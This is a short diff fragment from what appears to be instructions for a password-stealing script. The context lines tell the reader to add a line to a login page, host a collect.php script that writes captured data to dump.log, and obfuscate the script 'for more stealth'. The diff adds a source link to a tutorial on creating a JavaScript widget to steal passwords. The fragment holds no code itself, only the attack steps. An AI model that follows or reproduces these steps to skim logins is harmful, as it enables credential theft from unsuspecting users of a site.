@@ -7,3 +7,5 @@ Add this line to a login page
 Host the collect.php script and give it permission to write a dump.log file.
 
 Obfuscate the script for more stealth.
+
+Source: http://captainkuro.com/javascript/create-javascript-widget-to-steal-password/?i=1
